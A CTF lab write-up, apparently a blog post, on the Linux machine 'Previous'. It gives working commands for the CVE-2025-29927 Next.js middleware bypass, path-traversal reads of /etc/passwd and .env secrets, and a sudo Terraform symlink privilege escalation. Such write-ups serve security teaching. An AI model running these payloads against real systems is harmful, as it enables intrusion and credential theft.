@@ -1,0 +1,385 @@
+---
+layout: post
+title: "Previous"
+date: 2025-10-14 04:00:00 -0400
+author: Hugo Beaulieu
+categories: linux machine
+tags: linux nextjs cve-2025-29927 lfi terraform symlink
+---
+
+## Overview
+
+Previous is a Linux machine running a Next.js application vulnerable to CVE-2025-29927, which allows middleware bypass and local file inclusion. The exploitation involves bypassing middleware protection to access hidden API endpoints, extracting hardcoded credentials from server-side JavaScript files, and escalating privileges through Terraform provider path manipulation with symbolic links.
+
+## Initial Enumeration
+
+### Nmap Scan
+
+We start with an nmap scan:
+
+```bash
+nmap -sV -v 10.129.xxx.xxx
+```
+
+Results:
+
+```
+PORT   STATE SERVICE
+80/tcp open  http
+```
+
+A web server is running on port 80.
+
+## Web Application Analysis
+
+### Initial Discovery
+
+Accessing the website, we find a login page for documentation:
+
+```
+http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs
+```
+
+### Technology Stack
+
+Using nikto, we identify the framework:
+
+```bash
+nikto -h http://previous.htb/
+```
+
+Result:
+
+```
+Retrieved x-powered-by header: Next.js
+```
+
+The application is built with **Next.js**, a popular React framework.
+
+### Username Discovery
+
+Using cewl to extract information from the website:
+
+```bash
+cewl http://previous.htb/
+```
+
+We find an email address:
+
+```
+jeremy@previous.htb
+```
+
+This gives us a potential username: `jeremy`.
+
+### Authentication API Analysis
+
+When accessing the login page, we observe these API calls:
+
+```
+GET http://previous.htb/api/auth/providers
+Response: {
+  "credentials": {
+    "id": "credentials",
+    "name": "Credentials",
+    "type": "credentials",
+    "signinUrl": "http://localhost:3000/api/auth/signin/credentials",
+    "callbackUrl": "http://localhost:3000/api/auth/callback/credentials"
+  }
+}
+
+GET http://previous.htb/api/auth/csrf
+Response: f5748834f8f3f9c77a2bd17a56c23326399219844ea54d93ffcedfb943a6f5f7
+```
+
+Session cookies observed:
+
+```
+next-auth.callback-url: "http://localhost:3000/docs"
+next-auth.csrf-token: "f5748834f8f3f9c77a2bd17a56c23326399219844ea54d93ffcedfb943a6f5f7|..."
+```
+
+## CVE-2025-29927 Exploitation
+
+### Identifying the Vulnerability
+
+We discover **CVE-2025-29927**, which affects Next.js middleware. This vulnerability allows bypassing middleware protection through a specially crafted header.
+
+### Testing the Exploit
+
+We test different middleware bypass payloads using Burp Suite:
+
+```
+x-middleware-subrequest: pages/_middleware
+x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
+```
+
+The header `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` successfully bypasses authentication!
+
+### Discovering Hidden Endpoints
+
+With middleware bypassed, we discover previously hidden documentation URLs:
+
+```
+http://previous.htb/docs/getting-started
+http://previous.htb/docs/api-reference
+http://previous.htb/docs/examples
+```
+
+We also find a file download API:
+
+```
+http://previous.htb/api/download?example=hello-world.ts
+```
+
+## Local File Inclusion
+
+### Testing LFI
+
+We can manipulate the download endpoint to read arbitrary files:
+
+```bash
+curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
+  "http://previous.htb/api/download?example=../../../etc/passwd"
+```
+
+Success! We can read `/etc/passwd`:
+
+```
+root:x:0:0:root:/root:/bin/sh
+...
+node:x:1000:1000::/home/node:/bin/sh
+nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
+```
+
+We identify two users: `node` and `nextjs`.
+
+### Discovering Application Structure
+
+Reading `/proc/self/environ`:
+
+```bash
+curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
+  "http://previous.htb/api/download?example=../../../proc/self/environ"
+```
+
+Result:
+
+```
+NODE_VERSION=18.20.8
+HOSTNAME=0.0.0.0
+PWD=/app
+NODE_ENV=production
+NEXT_TELEMETRY_DISABLED=1
+```
+
+The application is running from `/app`.
+
+### Extracting Environment Variables
+
+We read the `.env` file:
+
+```bash
+curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
+  "http://previous.htb/api/download?example=../../../app/.env"
+```
+
+Result:
+
+```
+NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
+```
+
+### Finding Hardcoded Credentials
+
+After generating a wordlist of potential Next.js file locations, we find:
+
+```
+/api/download?example=../../../app/.next/server/pages/api/auth/[...nextauth].js
+```
+
+This compiled server-side JavaScript file contains hardcoded credentials:
+
+```javascript
+username: "jeremy"
+password: "MyNameIsJeremyAndILovePancakes"
+```
+
+## SSH Access
+
+We SSH into the server with the discovered credentials:
+
+```bash
+ssh jeremy@previous.htb
+# Password: MyNameIsJeremyAndILovePancakes
+```
+
+Success! We retrieve the user flag.
+
+## Privilege Escalation Enumeration
+
+### Home Directory Analysis
+
+Listing jeremy's home directory:
+
+```bash
+ls -lah
+```
+
+Results:
+
+```
+drwxr-x--- 6 jeremy jeremy 4.0K Sep 26 04:46 .
+drwxr-xr-x 3 root   root   4.0K Aug 21 20:09 ..
+lrwxrwxrwx 1 root   root      9 Aug 21 19:57 .bash_history -> /dev/null
+-rw-r--r-- 1 jeremy jeremy  220 Aug 21 17:28 .bash_logout
+-rw-r--r-- 1 jeremy jeremy 3.7K Aug 21 17:28 .bashrc
+drwx------ 2 jeremy jeremy 4.0K Aug 21 20:09 .cache
+drwxr-xr-x 3 jeremy jeremy 4.0K Aug 21 20:09 docker
+-rw-r--r-- 1 jeremy jeremy  807 Aug 21 17:28 .profile
+drwxrwxr-x 3 jeremy jeremy 4.0K Sep 26 04:46 root
+drwxr-xr-x 2 root   root   4.0K Sep 26 04:18 .terraform.d
+-rw-rw-r-- 1 jeremy jeremy  150 Aug 21 18:48 .terraformrc
+lrwxrwxrwx 1 jeremy jeremy    4 Sep 26 04:45 tmp_link -> /tmp
+-rw-r----- 1 root   jeremy   33 Sep 25 21:57 user.txt
+```
+
+Unusual findings:
+- `.terraformrc` file
+- `.terraform.d` directory
+- A `root` directory owned by jeremy
+
+### Terraform Configuration
+
+Reading `.terraformrc`:
+
+```bash
+cat .terraformrc
+```
+
+Content:
+
+```hcl
+provider_installation {
+  dev_overrides {
+    "previous.htb/terraform/examples" = "/usr/local/go/bin"
+  }
+  direct {}
+}
+```
+
+This suggests Terraform with custom provider overrides.
+
+### Sudo Privileges
+
+```bash
+sudo -l
+```
+
+Result:
+
+```
+Matching Defaults entries for jeremy on previous:
+    !env_reset, env_delete+=PATH, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User jeremy may run the following commands on previous:
+    (root) /usr/bin/terraform -chdir\=/opt/examples apply
+```
+
+Jeremy can run `terraform apply` as root, but only from the `/opt/examples` directory!
+
+## Terraform Privilege Escalation
+
+### Analyzing the Terraform Configuration
+
+Reading `/opt/examples/main.tf`:
+
+```bash
+cat /opt/examples/main.tf
+```
+
+Content:
+
+```hcl
+terraform {
+  required_providers {
+    examples = {
+      source = "previous.htb/terraform/examples"
+    }
+  }
+}
+
+variable "source_path" {
+  type = string
+  default = "/root/examples/hello-world.ts"
+
+  validation {
+    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
+    error_message = "The source_path must contain '/root/examples/'."
+  }
+}
+
+provider "examples" {}
+```
+
+The validation rule requires:
+- Path must contain `/root/examples/`
+- Path cannot contain `..`
+
+This prevents directory traversal, but there's a bypass!
+
+### Symlink Bypass
+
+We can create a symbolic link that satisfies the validation while pointing to any file:
+
+```bash
+# Create directory structure
+mkdir -p /home/jeremy/root/examples
+
+# Create symlink to root filesystem
+ln -s / /home/jeremy/root/examples/srv_root_link
+```
+
+Now we have:
+
+```
+/home/jeremy/root/examples/srv_root_link -> /
+```
+
+This means:
+
+```
+/home/jeremy/root/examples/srv_root_link/root/root.txt
+```
+
+Points to `/root/root.txt` while technically containing `/root/examples/` in the path!
+
+### Exploitation
+
+Set the Terraform variable:
+
+```bash
+export TF_VAR_source_path="/home/jeremy/root/examples/srv_root_link/root/root.txt"
+```
+
+Run terraform as root:
+
+```bash
+sudo /usr/bin/terraform -chdir=/opt/examples apply
+```
+
+Terraform will process the file at the symlinked location, allowing us to read `/root/root.txt` and obtain the root flag!
+
+## Key Takeaways
+
+- **CVE-2025-29927** bypasses Next.js middleware through header manipulation
+- **Compiled Next.js files** in `.next/server/` can contain hardcoded credentials
+- **Local File Inclusion** in Next.js can expose environment variables and source code
+- **Path validation bypasses** can be achieved through symbolic links
+- **Terraform with sudo** can be exploited when path restrictions are improperly implemented
+- **Custom provider overrides** in Terraform can be leveraged for privilege escalation
+- **Symlinks satisfy substring checks** while pointing to arbitrary locations
+- **Environment variable control** in Terraform allows passing arbitrary paths to root-executed commands
